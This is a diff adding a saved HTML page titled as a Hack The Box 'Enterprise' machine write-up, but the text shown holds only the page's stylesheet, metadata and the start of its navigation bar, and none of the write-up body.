@@ -1,0 +1,4249 @@
+<!DOCTYPE html>
+<!-- saved from url=(0044)https://alamot.github.io/enterprise_writeup/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="generator" content="Hugo 0.99.1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<link rel="stylesheet" href="./Enterprise (Hack The Box) write-up - The Portal of Knowledge_files/noncrit.css" as="style" onload="this.rel=&#39;stylesheet&#39;">
+<noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
+<style>
+button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}
+*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:before,:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
+input,button,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}
+.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}
+[role="button"]{cursor: pointer;}
+.container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}@media (min-width: 768px){.container{width:750px}}@media (min-width: 992px){.container{width:970px}}@media (min-width: 1200px){.container{width:1170px}}.container-fluid{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.row{margin-left:-15px;margin-right:-15px}
+.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 { position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; }
+@media (min-width: 768px){.col-sm-1,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-10,.col-sm-11,.col-sm-12{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width: 992px){.col-md-1,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-10,.col-md-11,.col-md-12{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}
+label { display: inline-block; max-width: 100%; margin-bottom: 5px; font-weight: bold; }
+.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:16px;line-height:1.4;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.btn:focus,.btn:active:focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn.active.focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:hover,.btn:focus,.btn.focus{color:#333;text-decoration:none}.btn:active,.btn.active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{cursor:not-allowed;opacity:.65;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none}a.btn.disabled,fieldset[disabled] a.btn{pointer-events:none}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default:focus,.btn-default.focus{color:#333;background-color:#e6e6e6;border-color:#8c8c8c}.btn-default:hover{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active:hover,.btn-default.active:hover,.open > .dropdown-toggle.btn-default:hover,.btn-default:active:focus,.btn-default.active:focus,.open > .dropdown-toggle.btn-default:focus,.btn-default:active.focus,.btn-default.active.focus,.open > .dropdown-toggle.btn-default.focus{color:#333;background-color:#d4d4d4;border-color:#8c8c8c}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{background-image:none}.btn-default.disabled:hover,.btn-default[disabled]:hover,fieldset[disabled] .btn-default:hover,.btn-default.disabled:focus,.btn-default[disabled]:focus,fieldset[disabled] .btn-default:focus,.btn-default.disabled.focus,.btn-default[disabled].focus,fieldset[disabled] .btn-default.focus{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#195eff;border-color:#004cff}.btn-primary:focus,.btn-primary.focus{color:#fff;background-color:#0045e5;border-color:#00267f}.btn-primary:hover{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active:hover,.btn-primary.active:hover,.open > .dropdown-toggle.btn-primary:hover,.btn-primary:active:focus,.btn-primary.active:focus,.open > .dropdown-toggle.btn-primary:focus,.btn-primary:active.focus,.btn-primary.active.focus,.open > .dropdown-toggle.btn-primary.focus{color:#fff;background-color:#003ac1;border-color:#00267f}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled:hover,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus,fieldset[disabled] .btn-primary:focus,.btn-primary.disabled.focus,.btn-primary[disabled].focus,fieldset[disabled] .btn-primary.focus{background-color:#195eff;border-color:#004cff}.btn-primary .badge{color:#195eff;background-color:#fff}.btn-success{color:#fff;background-color:#00bc16;border-color:#00a313}.btn-success:focus,.btn-success.focus{color:#fff;background-color:#008910;border-color:#002304}.btn-success:hover{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active:hover,.btn-success.active:hover,.open > .dropdown-toggle.btn-success:hover,.btn-success:active:focus,.btn-success.active:focus,.open > .dropdown-toggle.btn-success:focus,.btn-success:active.focus,.btn-success.active.focus,.open > .dropdown-toggle.btn-success.focus{color:#fff;background-color:#00650c;border-color:#002304}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{background-image:none}.btn-success.disabled:hover,.btn-success[disabled]:hover,fieldset[disabled] .btn-success:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus,fieldset[disabled] .btn-success:focus,.btn-success.disabled.focus,.btn-success[disabled].focus,fieldset[disabled] .btn-success.focus{background-color:#00bc16;border-color:#00a313}.btn-success .badge{color:#00bc16;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info:focus,.btn-info.focus{color:#fff;background-color:#31b0d5;border-color:#1b6d85}.btn-info:hover{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active:hover,.btn-info.active:hover,.open > .dropdown-toggle.btn-info:hover,.btn-info:active:focus,.btn-info.active:focus,.open > .dropdown-toggle.btn-info:focus,.btn-info:active.focus,.btn-info.active.focus,.open > .dropdown-toggle.btn-info.focus{color:#fff;background-color:#269abc;border-color:#1b6d85}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{background-image:none}.btn-info.disabled:hover,.btn-info[disabled]:hover,fieldset[disabled] .btn-info:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus,fieldset[disabled] .btn-info:focus,.btn-info.disabled.focus,.btn-info[disabled].focus,fieldset[disabled] .btn-info.focus{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:focus,.btn-warning.focus{color:#fff;background-color:#ec971f;border-color:#985f0d}.btn-warning:hover{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active:hover,.btn-warning.active:hover,.open > .dropdown-toggle.btn-warning:hover,.btn-warning:active:focus,.btn-warning.active:focus,.open > .dropdown-toggle.btn-warning:focus,.btn-warning:active.focus,.btn-warning.active.focus,.open > .dropdown-toggle.btn-warning.focus{color:#fff;background-color:#d58512;border-color:#985f0d}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled:hover,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning:hover,.btn-warning.disabled:focus,.btn-warning[disabled]:focus,fieldset[disabled] .btn-warning:focus,.btn-warning.disabled.focus,.btn-warning[disabled].focus,fieldset[disabled] .btn-warning.focus{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:focus,.btn-danger.focus{color:#fff;background-color:#c9302c;border-color:#761c19}.btn-danger:hover{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active:hover,.btn-danger.active:hover,.open > .dropdown-toggle.btn-danger:hover,.btn-danger:active:focus,.btn-danger.active:focus,.open > .dropdown-toggle.btn-danger:focus,.btn-danger:active.focus,.btn-danger.active.focus,.open > .dropdown-toggle.btn-danger.focus{color:#fff;background-color:#ac2925;border-color:#761c19}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled:hover,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger:hover,.btn-danger.disabled:focus,.btn-danger[disabled]:focus,fieldset[disabled] .btn-danger:focus,.btn-danger.disabled.focus,.btn-danger[disabled].focus,fieldset[disabled] .btn-danger.focus{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{color:#000;font-weight:400;border-radius:0}.btn-link,.btn-link:active,.btn-link.active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:hover,.btn-link:focus,.btn-link:active{border-color:transparent}.btn-link:hover,.btn-link:focus{color:#000;text-decoration:none;background-color:transparent}.btn-link[disabled]:hover,fieldset[disabled] .btn-link:hover,.btn-link[disabled]:focus,fieldset[disabled] .btn-link:focus{color:#777;text-decoration:none}.btn-lg{padding:10px 16px;font-size:20px;line-height:1.3333333;border-radius:6px}.btn-sm{padding:5px 10px;font-size:14px;line-height:1.5;border-radius:3px}.btn-xs{padding:1px 5px;font-size:14px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block + .btn-block{margin-top:5px}
+.dropup,.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;list-style:none;font-size:16px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);-webkit-background-clip:padding-box;background-clip:padding-box}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu > li > a{display:block;padding:3px 10px;clear:both;font-weight:400;line-height:1.4;color:#333;white-space:nowrap}.dropdown-menu > li > a:hover,.dropdown-menu > li > a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu > .active > a,.dropdown-menu > .active > a:hover,.dropdown-menu > .active > a:focus{color:#fff;text-decoration:none;outline:0;background-color:#195eff}.dropdown-menu > .disabled > a,.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{color:#777}.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);cursor:not-allowed}.open > .dropdown-menu{display:block}.open > a{outline:0}.dropdown-menu-right{left:auto;right:0}.dropdown-menu-left{left:0;right:auto}.dropdown-header{display:block;padding:3px 10px;font-size:14px;line-height:1.4;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}.pull-right > .dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px dashed;border-bottom:4px solid \9;content:""}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:2px}
+.nav{margin-bottom:0;padding-left:0;list-style:none}.nav > li{position:relative;display:block}.nav > li > a{position:relative;display:block;padding:5px 10px}.nav > li > a:hover,.nav > li > a:focus{text-decoration:none;background-color:#a52a2a}.nav > li.disabled > a{color:#777}.nav > li.disabled > a:hover,.nav > li.disabled > a:focus{color:#777;text-decoration:none;background-color:transparent;cursor:not-allowed}.nav .open > a,.nav .open > a:hover,.nav .open > a:focus{background-color:#a52a2a;border-color:#000}.nav .nav-divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.nav > li > a > img{max-width:none}.nav-pills > li{float:left}.nav-pills > li > a{border-radius:4px}.nav-pills > li + li{margin-left:2px}.nav-pills > li.active > a,.nav-pills > li.active > a:hover,.nav-pills > li.active > a:focus{color:#fff;background-color:#195eff}.nav-stacked > li{float:none}.nav-stacked > li + li{margin-top:0px;margin-left:0}.navbar{position:relative;min-height:48px;max-height:48px;margin-bottom:22px;border:1px solid transparent}@media (min-width: 768px){.navbar{border-radius:4px}}@media (max-device-width: 480px) and (orientation: landscape){.navbar-fixed-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{max-height:200px}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width: 768px){.navbar-static-top{border-radius:0}}.navbar-fixed-top,.navbar-fixed-bottom{position:fixed;right:0;left:0;z-index:1030}@media (min-width: 768px){.navbar-fixed-top,.navbar-fixed-bottom{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}@media (min-width: 768px){.navbar > .container .navbar-brand,.navbar > .container-fluid .navbar-brand{margin-left:-15px}}.navbar-fixed-bottom .navbar-nav > li > .dropdown-menu{margin-bottom:0;border-top-right-radius:4px;border-top-left-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-default{background-color:#7d1935;border-color:#611329}.navbar-default .navbar-nav > li > a{color:#fff}.navbar-default .navbar-nav > li > a:hover,.navbar-default .navbar-nav > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav > .active > a,.navbar-default .navbar-nav > .active > a:hover,.navbar-default .navbar-nav > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav > .disabled > a,.navbar-default .navbar-nav > .disabled > a:hover,.navbar-default .navbar-nav > .disabled > a:focus{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#a52a2a}.navbar-default .navbar-toggle:hover,.navbar-default .navbar-toggle:focus{background-color:#a52a2a}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#611329}.navbar-default .navbar-nav > .open > a,.navbar-default .navbar-nav > .open > a:hover,.navbar-default .navbar-nav > .open > a:focus{background-color:#611329;color:#fff}@media (max-width: 767px){.navbar-default .navbar-nav .open .dropdown-menu > li > a{color:#fff}.navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav .open .dropdown-menu > .active > a,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#fff}.navbar-default .navbar-link:hover{color:#fff}.navbar-default .btn-link{color:#fff}.navbar-default .btn-link:hover,.navbar-default .btn-link:focus{color:#fff}
+.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:hover,a.label:focus{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:hover,.label-default[href]:focus{background-color:#5e5e5e}.label-primary{background-color:#195eff}.label-primary[href]:hover,.label-primary[href]:focus{background-color:#0045e5}.label-success{background-color:#00bc16}.label-success[href]:hover,.label-success[href]:focus{background-color:#008910}.label-info{background-color:#5bc0de}.label-info[href]:hover,.label-info[href]:focus{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:hover,.label-warning[href]:focus{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:hover,.label-danger[href]:focus{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:14px;font-weight:700;color:#fff;line-height:1;vertical-align:middle;white-space:nowrap;text-align:center;background-color:#000;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-xs .badge,.btn-group-xs > .btn .badge{top:0;padding:1px 5px}a.badge:hover,a.badge:focus{color:#fff;text-decoration:none;cursor:pointer}
+.nav-pills > .active > a > .badge{color:#000;background-color:#fff}.nav-pills > li > a > .badge{margin-left:3px}
+.clearfix:before,.clearfix:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.nav:before,.nav:after,.navbar:before,.navbar:after,.navbar-header:before,.navbar-header:after,.navbar-collapse:before,.navbar-collapse:after{content:" ";display:table}.clearfix:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.nav:after,.navbar:after,.navbar-header:after,.navbar-collapse:after{clear:both}
+.pull-right { float: right !important; } .pull-left { float: left !important; }
+
+ 
+html { font-size:16px; }
+body:not(.en) :lang(en), body:not(.el) :lang(el), body:not(.fr) :lang(fr) { display: none; }
+body {
+  font-size: 16px; line-height: 1.45; color: #000000;  background-color: #eceff1;
+  margin: 0; padding-top: 70px; 
+  font-family: 'Open Sans', 'Times New Roman', sans-serif;
+  -webkit-animation: bugfix infinite 1s;
+}
+@-webkit-keyframes bugfix { from { fill: 0; } to { fill: 0; } }
+
+a { color: #000; word-wrap: break-word; text-decoration: none; }
+a:hover, a:focus, a:active { color: black; text-decoration: none; }
+a.label { box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
+figure {  display: table; margin: 10px auto; }
+figure figcaption { caption-side: bottom; color: darkblue; display: table-caption;
+font-size: 14px; margin-top: 5px; text-align:justify; }
+h1, h2, h3, h4, h5, h6 { margin:0px; text-align: justify; }
+img { max-width: 100%; }
+img.bordered { border:1px solid #021a40;  border-radius:20px; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
+li { line-height: 1.5rem; text-align:justify; }
+p { text-align:justify; text-indent: 30px; }
+section { margin-top: 1rem; margin-bottom: 1rem; }
+section>header { margin-bottom: .3rem; }
+ul, ol { padding-left: 1.5rem; }
+
+article .image { background-size: cover; background-position: center; }
+article time { font-size: .8rem; }
+article.grid { max-width:384px; margin-bottom:0.5rem; height:26rem; overflow: hidden; }
+article.grid .image { min-height: 12rem; }
+article.grid footer { padding: 1rem; background-color: #ffffe6; }
+article.grid .title { overflow: hidden; }
+article.grid .summary { color: #333; font-size: .8rem; line-height: 1rem; max-height: 5rem; overflow: hidden; }
+article.single { background-color: #fff; margin: 0 auto; padding-bottom: 1rem; max-width:1200px; }
+article.single .image { max-width:786px; min-height: 24rem; margin-left:auto; margin-right:auto; }
+article.single .body { margin-bottom: 2rem;  padding: 0 5rem; }
+article.single .body a:not(.label) { color: #78909c; text-decoration: underline; }
+article.single .body>h1, article.single .body>h2, article.single .body>h3 { padding-top: 60px; margin-top: -30px; margin-bottom: 0.5rem; }
+article.single .body li {  margin: 0.5rem auto; }
+article.li { margin-bottom: .5rem; font-size: .8rem; line-height: 1rem; }
+article.li .cell { display:table-cell; vertical-align: middle; }
+article.li .image { width: 4.1rem; height: 4.1rem; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
+article.li footer { display:table-cell; vertical-align: middle; padding-left: .5rem;  }
+article.li time { font-size: .7rem; }
+article.li .title { font-size: 0.85rem; line-height: 1rem; font-weight: 700; }
+
+.body .title { font-size: 2rem; line-height: 3rem; margin: 0.5rem auto; }
+.label { display:inline-block; padding-top: 0.25rem; }
+
+.navbar * { color: white !important; }
+.navbar .dropdown-menu a:hover { background-color: brown; }
+.nav>li>a:hover, .nav>li>a:focus { color: white; background-color: brown; }
+.nav-pills { display: inline-block; margin: 0; }
+.nav-pills>li.active>a { font-weight: 700 !important; background-color: #00bc16 !important; }
+.nav-pills>li.active>a .badge { color: #00bc16; }
+.cssdropdown { margin-top: 2rem; }
+.cssdropdown input[type=checkbox], .cssdropdown ul { display: none; }
+.cssdropdown label { font-size: 1.25rem; font-weight:700; min-width: 300px; }
+.cssdropdown input[type=checkbox]:checked ~ ul { display: table-cell; }
+
+.p-logo {
+  font-family: 'Comic Sans MS', cursive; font-weight: bold; font-size: 2rem;
+  text-shadow: 4px 2px 2px rgba(0,0,0,0.75);
+  margin-top: 3px;
+}
+.l-footer * { color: white; }
+.l-footer { background-color: #7D1935; padding: 0.75rem 0; text-align: center; }
+
+.lgfont { font-size: 2rem; }
+.margin-sm { margin: 0.5rem; }
+.side-margins-1 { margin-left: 1rem !important; margin-right: 1rem !important; }
+.side-margins-2 { margin-left: 2rem !important;; margin-right: 2rem !important; }
+.margin-top-sm {  margin-top: 0.5rem; }
+.topmargin5 {  margin-top: 5px; }
+.topmargin7 { margin-top: 7px; }
+
+#search-section, #results-section { display:none; }
+#TableOfContents ul { list-style: none; }
+#TableOfContents>ul {  padding-left: 0; font-weight: 700; }
+#TableOfContents>ul ul { font-weight: normal; }
+
+.summary { text-align:justify; }
+.max-width640 { max-width: 640px; }
+.floatleft { float:left; margin-right: 10px; }
+.floatright { float:right; margin-left: 10px; }
+
+.centered { margin-left: auto !important;  margin-right: auto !important; }
+img.centered { display:block !important; }
+div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.centered, h2.centered, h3.centered { text-align:center !important; }
+
+@media (max-width: 768px) {
+  h1 { font-size: 1.4rem; line-height: 1.5rem; }
+  h2 { font-size: 1.2rem; line-height: 1.5rem; }
+  article.single .image { min-height: 12rem; }
+  article.single .body pre { margin: 1rem -1rem; }
+  article.single .body pre code { padding: 1rem 1rem; }
+  article.single .body { padding: 0 1rem; }
+  ul.scroll-menu { max-height: 250px; }
+  .cssdropdown label, .nav-stacked>li>a { min-width: 240px; }
+  .hidden768 { display:none; }
+  .text-smaller {
+    font-family: 'Open Sans', 'Times New Roman', sans-serif;
+    font-size: 1rem;  font-weight: 700; letter-spacing: -1px;
+    padding-left: 0px !important;  padding-right: 0px !important;
+    line-height:32px;
+  }
+}
+</style>
+<link rel="alternate" type="application/rss+xml" title="RSS" href="https://alamot.github.io/index.xml">
+
+  <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge">
+
+
+  <title>Enterprise (Hack The Box) write-up - The Portal of Knowledge</title>
+  <meta property="og:title" content="Enterprise (Hack The Box) write-up - The Portal of Knowledge">
+  <meta property="og:type" content="article">
+  <meta name="description" content="Write-up for the Enterprise machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Enterprise του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Enterprise machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Enterprise του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/space.jpg">
+  <meta property="og:image:width" content="768">
+  <meta property="og:image:height" content="384">
+
+<meta property="og:url" content="https://alamot.github.io/enterprise_writeup/">
+
+
+<script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage":{
+      "@type":"WebPage",
+      "@id":"https:\/\/alamot.github.io\/"
+    },
+    "headline": "Enterprise (Hack The Box) write-up |  ",
+    "image": {
+      "@type": "ImageObject",
+      "url": "",
+      "height": 700,
+      "width": 700
+    },
+    "datePublished": "2018-03-19T00:00:00JST",
+    "dateModified": "2018-03-19T00:00:00JST",
+    "author": {
+      "@type": "Person",
+      "name": "Antonios Tsolis",
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
+        "height": 60,
+        "width": 60
+      }
+    },
+    "description": ""
+  }
+</script>
+</head>
+<body id="mainbody" class="en" lang="en">
+<nav class="navbar navbar-default navbar-fixed-top centered">
+<div class="container-fluid">
+  
+   <ul class="nav nav-pills pull-left topmargin7">
+    <li id="content-selector" role="presentation" class="dropdown">
